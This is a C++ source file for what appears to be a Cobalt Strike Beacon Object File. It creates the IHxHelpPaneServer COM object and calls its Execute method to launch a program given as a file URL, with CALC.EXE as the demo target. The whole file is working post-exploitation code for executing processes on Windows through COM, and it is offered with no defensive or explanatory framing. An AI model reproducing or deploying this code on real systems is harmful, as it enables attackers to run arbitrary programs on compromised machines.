#include <Windows.h>
#include <combaseapi.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT  
#define DECLSPEC_IMPORT
#pragma comment(lib, "ole32.lib")
#endif

extern "C" {
#include "beacon.h"
    DFR(OLE32, CoInitialize);
#define CoInitialize OLE32$CoInitialize
    DFR(OLE32, CoCreateInstance);
#define CoCreateInstance OLE32$CoCreateInstance
    DFR(OLE32, CLSIDFromString);
#define CLSIDFromString OLE32$CLSIDFromString
    DFR(OLE32, CoUninitialize);
#define CoUninitialize OLE32$CoUninitialize
   
    struct __declspec(uuid("{8cec592c-07a1-11d9-b15e-000d56bfe6ee}"))
        IHxHelpPaneServer : public IUnknown {
        virtual HRESULT __stdcall DisplayTask(PWCHAR) = 0;
        virtual HRESULT __stdcall DisplayContents(PWCHAR) = 0;
        virtual HRESULT __stdcall DisplaySearchResults(PWCHAR) = 0;
        virtual HRESULT __stdcall Execute(const PWCHAR) = 0;
    };

    DWORD Win32FromHResult(HRESULT Result) {
        if ((Result & 0xFFFF0000) == MAKE_HRESULT(SEVERITY_ERROR, FACILITY_WIN32, 0))
            return HRESULT_CODE(Result);

        if (Result == S_OK)
            return ERROR_SUCCESS;

        return ERROR_CAN_NOT_COMPLETE;
    }

    HRESULT CoInitializeIHxHelpIds(LPGUID Clsid, LPGUID Iid) {
        HRESULT Result = S_OK;

        if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}", Clsid)))
            return Result;

        if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec592c-07a1-11d9-b15e-000d56bfe6ee}", Iid)))
            return Result;

        return Result;
    }

    DWORD ComSpawn() {
        HRESULT Result = S_OK;
        GUID CLSID_IHxHelpPaneServer;
        GUID IID_IHxHelpPaneServer;
        WCHAR pcUrl[256] = L"file:///C:/WINDOWS/SYSTEM32/CALC.EXE";
        IHxHelpPaneServer* Help = nullptr;

        if (!SUCCEEDED(Result = CoInitializeIHxHelpIds(&CLSID_IHxHelpPaneServer, &IID_IHxHelpPaneServer))) {
            return Win32FromHResult(Result);
        }

        if (!SUCCEEDED(Result = CoInitialize(NULL))) {
            return Win32FromHResult(Result);
        }

        if (!SUCCEEDED(Result = CoCreateInstance(CLSID_IHxHelpPaneServer, NULL, CLSCTX_ALL, IID_IHxHelpPaneServer, (PVOID*)&Help))) {
            CoUninitialize();
            return Win32FromHResult(Result);
        }

        Result = Help->Execute(pcUrl);
        if (FAILED(Result)) {
        }
        else {
        }

        if (Help)
            Help->Release();

        CoUninitialize();
        return Win32FromHResult(Result);
    }

    void go(char* args, int len) {
        ComSpawn();
    }
}

#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    bof::runMocked<>(go);
    return 0;
}

#elif defined(_GTEST)
#include <gtest\gtest.h>
#endif
